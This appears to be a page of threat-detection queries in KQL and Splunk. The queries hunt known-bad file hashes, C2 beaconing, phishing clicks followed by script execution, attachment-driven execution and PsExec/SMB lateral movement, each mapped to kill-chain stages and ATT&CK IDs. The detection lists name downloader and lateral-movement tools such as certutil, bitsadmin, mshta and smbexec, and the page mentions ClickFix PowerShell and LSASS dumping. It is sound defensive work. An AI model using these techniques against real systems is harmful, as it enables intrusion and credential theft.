let BadHashes = dynamic(["ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df", "1e8538c6e0563d50da0f2e097e979ebd5294ce1defe01d0b9fe361ba3bed1898", "e7d582b98ca80690883175470e96f703ef6dc497", "12f35b1081b17d21815b35feb57ab03d02482116", "820fa07a7328b6cf2b417078e103721d4d8f2e79"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Scheduled task created with suspicious image / encoded args · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Remote service execution — PsExec / SMB lateral movement · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft)
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.

Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688            // process-create (audit-policy required)
| where Account !endswith "$"
| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc
